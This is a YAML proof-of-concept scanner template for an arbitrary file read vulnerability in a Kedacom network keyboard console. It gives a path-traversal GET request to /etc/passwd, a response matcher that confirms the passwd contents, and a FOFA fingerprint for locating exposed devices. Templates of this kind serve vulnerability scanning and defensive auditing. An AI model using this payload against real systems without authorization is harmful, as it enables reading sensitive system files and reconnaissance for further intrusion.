id: poc-yaml-kedacom-nkc-anyfile-read
info:
  name: 科达 网络键盘控制台 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 科达 网络键盘控制台
  fofa: 网络键盘控制台
requests:
- method: GET
  path: /../../../../../../../../etc/passwd
  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
    && !contains(body,"<") && contains(headers,"/etc/passwd") && contains(headers,"kedacom")
variables: {}
transport: http
